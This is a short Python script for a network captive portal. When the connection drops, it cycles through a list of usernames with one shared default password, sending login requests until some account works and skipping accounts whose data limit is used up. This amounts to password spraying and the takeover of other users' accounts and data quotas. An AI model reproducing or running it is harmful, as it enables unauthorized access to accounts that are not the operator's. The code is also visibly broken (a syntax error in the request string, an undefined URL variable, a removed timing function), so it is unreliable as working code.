# This script must be run as sudo

import urllib.request
import socket
import re
import random
import time 
import keyboard

HOST_URL = 'host_login_url'
USERNAME_LIST = []
USERNAME_PREFIX = "default_prefix"
CHOICE = ''
PASSWORD = "default_password"

def connect():
    global CHOICE
    num = 0
    tempList = USERNAME_LIST
    while(1):
        try:
            CHOICE = random.choice(tempList)
            try:
                message = tryUser(CHOICE)
                if(message == '<![CDATA[You have successfully logged in]]>'):
                    print('Logged In As ' + USERNAME_PREFIX+CHOICE)
                    return True
                else:
                    if(message == '<![CDATA[Your data transfer has been exceeded, Please contact the administrator]]>'):
                        print('Connection Failed for '+USERNAME_PREFIX+CHOICE+'. Data Limit has already exceeded.')
                    if(message == '<![CDATA[The system could not log you on. Make sure your password is correct]]>'):
                        print('Connection Failed for '+USERNAME_PREFIX+CHOICE+' due to incorrect password.')
                    num=num+1
                tempList.remove(CHOICE)
                time.sleep(0.1)
            except:
                print("Couldn't Log In To Network :(")
                return False
        except:
            pass
            return False

#try to see if connection is stable
def isNotConnected():
    try:
        # can we resolve the host name
        host = socket.gethostbyname("www.google.com")
        # try to connect to the host
        s = socket.create_connection((host, 80), 2)
        return False
    except:
        pass
    return True

def tryUser(USERNAME_LIST):
    try:
            req = urllib.request.Request(host_url)
            data = 'mode=191&username='USERNAME_PREFIX+USERNAME_LIST+'&password='+PASSWORD+'&a=1355344698415' 
            data = data.encode('utf-8')
            get = urllib.request.urlopen(host_url,data)
            getData = get.read()
            getData = getData.decode('ascii')
            message = re.findall(r'<message>(.*?)</message>',str(getData))
            return message[0]
        
    except urllib.error.URLError as err:
            print(str(err))

while(1):

    if (keyboard.KEY_DOWN()):
        print("Connection has been stable for " + str(time.clock() - lastConnect) + " seconds.")

    #Looping here always. Cannot exit once inside this.
    if (isNotConnected()):
        if (keyboard.is_pressed(27)): #esc
            break
        print("Connection Lost\nAttempting Login...")
        connect()
        lastConnect = time.clock()